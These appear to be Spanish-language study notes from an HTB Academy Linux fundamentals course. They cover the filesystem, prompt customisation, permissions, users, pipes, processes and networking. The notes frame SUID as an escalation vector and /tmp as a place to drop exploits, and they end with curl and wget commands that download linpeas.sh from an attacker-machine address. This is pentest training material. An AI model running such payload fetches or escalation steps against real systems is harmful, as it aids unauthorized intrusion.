# HTB Academy: Linux Fundamentals

## Estructura del Sistema de Archivos (FHS)
A diferencia de Windows, en Linux todo nace desde la raíz `/`. No existen los discos `C:` o `D:`.



### Directorios Críticos a Recordar:
*   `/etc`: Contiene los archivos de configuración del sistema (ej. `/etc/passwd` para usuarios).
*   `/var/log`: Aquí se almacenan los registros (logs) del sistema. Vital para forense y auditoría.
*   `/tmp` y `/dev/shm`: Directorios temporales con permisos de escritura para cualquier usuario. Muy usados para subir exploits.
*   `/bin` y `/sbin`: Almacenan los binarios (comandos) ejecutables del sistema.

---

## Anatomía del Prompt de Linux

Cuando abres una terminal en Linux, lo primero que ves es el **Prompt** (indicador de línea de comandos). Comprender su estructura es fundamental para saber en todo momento quién eres, dónde estás y en qué máquina estás operando.

### Estructura Básica
Un prompt típico en sistemas basados en Debian/Ubuntu/HTB Academy luce así:

```bash
guest@linuxfund:~$ 
```

Este indicador se divide en las siguientes partes:

```text
┌─── Usuario actual (whoami)
│      ┌─── Separador ("at" / "en")
│      │  ┌─── Nombre del host/máquina (hostname)
│      │  │        ┌─── Separador
│      │  │        │ ┌─── Directorio de trabajo actual (pwd)
│      │  │        │ │ ┌─── Símbolo del Prompt (Tipo de usuario)
▼      ▼  ▼        ▼ ▼ ▼
guest  @  linuxfund : ~ $
```

### Desglose de Componentes

| Componente | Ejemplo | Descripción | Comando Útil |
| :--- | :--- | :--- | :--- |
| **Usuario** | `guest` | El usuario con el que has iniciado sesión. | `whoami` |
| **Separador** | `@` | Significa "at" (en). Une el usuario con la máquina. | - |
| **Hostname** | `linuxfund` | El nombre de red del equipo al que estás conectado. | `hostname` |
| **Separador** | `:` | Delimita el hostname del directorio de trabajo. | - |
| **Directorio Actual** | `~` | La ruta donde estás ubicado. `~` representa tu directorio Home (`/home/guest`). Si te mueves a otro directorio (ej: `/etc`), el prompt cambiará para reflejarlo. | `pwd` |
| **Símbolo de Shell** | `$` | Determina tu nivel de privilegios:<br>• `$` = Usuario estándar (privilegios limitados).<br>• `#` = Usuario root/administrador (privilegios máximos). | `id` |

---

### Personalización y la Variable `PS1`

El aspecto de este prompt no es estático; se define mediante una variable de entorno llamada **`PS1`** (Prompt String 1).

* **Ver tu configuración actual:**
  ```bash
  echo $PS1
  ```
* **Variables comunes de escape en `PS1`:**
  - `\u`: Nombre del usuario actual.
  - `\h`: Nombre del host (máquina) hasta el primer punto.
  - `\w`: Directorio de trabajo actual (ruta completa, con `~` para el Home).
  - `\W`: Únicamente el nombre de la carpeta actual (no la ruta completa).
  - `\$`: Muestra `#` si eres root, y `$` si eres un usuario normal.
  - `\t`: Hora actual en formato de 24 horas (HH:MM:SS).
  - `\T`: Hora actual en formato de 12 horas (HH:MM:SS).
  - `\d`: Fecha actual 
  - `\n`: Salto de línea
  - `\H`: Nombre completo del host.
  - `\j`: Numero de trabajos manejados por el shell
  - `\s`: Nombre del shell
  - `\v`: Version del shell
  - `\r`: Retorno de carro
  - `\@`: Hora actual

> [!TIP]
> En auditorías de seguridad y pentesting, es muy común encontrarse con "dumb shells" donde el prompt no se muestra o está roto. Saber cómo está estructurado te ayudará a identificar rápidamente si has logrado escalar privilegios a root (al notar el cambio de `$` a `#`).

---

## 🔒 Permisos y Propietarios

Linux cuenta con un sistema robusto de permisos para proteger la integridad de los archivos. Cada archivo y directorio tiene asignado un propietario y un grupo, junto con permisos definidos para tres categorías de usuarios:

- **Usuario (u):** El dueño del archivo.
- **Grupo (g):** Usuarios que pertenecen al grupo del archivo.
- **Otros (o):** Cualquier otro usuario del sistema.

### Tipos de Permisos
| Símbolo | Valor Octal | Descripción |
| :--- | :--- | :--- |
| **`r`** (read) | `4` | Permite leer el contenido del archivo / listar el directorio. |
| **`w`** (write) | `2` | Permite modificar el archivo / crear y borrar archivos en un directorio. |
| **`x`** (execute) | `1` | Permite ejecutar un binario/script / entrar a un directorio con `cd`. |

### Comandos de Administración
- **`chmod`**: Cambia los permisos de un archivo o directorio.
  - *Notación octal:* `chmod 755 script.sh` (Propietario: rwx [7], Grupo: r-x [5], Otros: r-x [5]).
  - *Notación simbólica:* `chmod +x script.sh` (añade permiso de ejecución a todos).
- **`chown`**: Cambia el propietario y/o grupo del archivo.
  - `chown root:root archivo.txt` (Cambia propietario a root y grupo a root).

### Permisos Especiales (Vectores de Escalada)
- **SUID (Set User ID - octal `4000` / `u+s`):** Permite ejecutar un archivo con los privilegios del propietario del archivo (si el propietario es `root`, el binario se ejecuta como root).
- **SGID (Set Group ID - octal `2000` / `g+s`):** Permite ejecutar un binario con los privilegios del grupo del archivo.

---

## 👥 Gestión de Usuarios y Privilegios

El control de accesos y la gestión de identidad es crucial para entender el alcance de una sesión en Linux.

### Archivos Clave del Sistema:
*   `/etc/passwd`: Listado de todas las cuentas locales, su UID (User ID), GID (Group ID), directorio Home y el shell asignado (ej. `/bin/bash` o `/usr/sbin/nologin`).
*   `/etc/shadow`: Almacena los hashes de las contraseñas cifradas y la información de expiración. Solo accesible por root.
*   `/etc/group`: Información de los grupos y los usuarios que pertenecen a ellos.

### Comandos de Identidad y Elevación:
- **`whoami`**: Muestra el nombre del usuario actual.
- **`id`**: Muestra el UID, GID y los grupos del usuario actual.
- **`groups`**: Lista los grupos a los que pertenece el usuario.
- **`sudo -l`**: Lista los privilegios de ejecución permitidos para el usuario actual utilizando `sudo`.

---

## 🔀 Redirecciones y Tuberías (Pipes)

En Linux, los comandos se comunican a través de tres flujos estándar de datos (File Descriptors):
1. **`stdin` (0):** Entrada estándar (teclado).
2. **`stdout` (1):** Salida estándar (pantalla).
3. **`stderr` (2):** Salida de errores (pantalla).

### Operadores de Redirección
- **`>`**: Redirige la salida estándar (`stdout`) a un archivo, **sobrescribiendo** su contenido.
  - `echo "hola" > archivo.txt`
- **`>>`**: Redirige la salida estándar a un archivo, **añadiendo** el contenido al final.
- **`2>&1`**: Redirige los errores (`stderr`) al mismo lugar que la salida estándar (`stdout`).
  - `find / -name "config.php" 2>/dev/null` (Envía los errores de "Permiso denegado" al vacío `/dev/null`).

### Tubería o Pipe (`|`)
Permite conectar la salida estándar de un comando directamente con la entrada estándar de otro.
- *Ejemplo:* `cat /etc/passwd | grep -i "bash"` (Filtra los usuarios con acceso a la consola interactiva bash).

---

## ⚙️ Procesos y Servicios

- **`ps aux`**: Muestra una instantánea de todos los procesos en ejecución en el sistema.
- **`top`** / **`htop`**: Monitor de procesos interactivo en tiempo real.
- **`kill -9 <PID>`**: Envía una señal SIGKILL para terminar de inmediato un proceso específico por su ID (PID).
- **`systemctl`**: Administrador de servicios del sistema (systemd).
  - `systemctl status ssh`: Verifica el estado del servicio SSH.
  - `systemctl restart apache2`: Reinicia el servidor web Apache.

---

## 🌐 Redes y Transferencia de Archivos

### Diagnóstico de Red
- **`ip a`**: Muestra la configuración de las interfaces de red e direcciones IP.
- **`ss -tlnp`** o **`netstat -tulnp`**: Muestra los puertos locales abiertos en escucha (`LISTEN`) y los procesos asociados.

### Descarga y Transferencia de Archivos (File Transfers)
Herramientas nativas para descargar herramientas o payloads desde nuestra máquina atacante:
```bash
# Descargar un archivo usando cURL (guarda con el nombre original usando -O)
curl -O http://10.10.14.x/linpeas.sh

# Descargar un archivo usando wget
wget http://10.10.14.x/linpeas.sh
```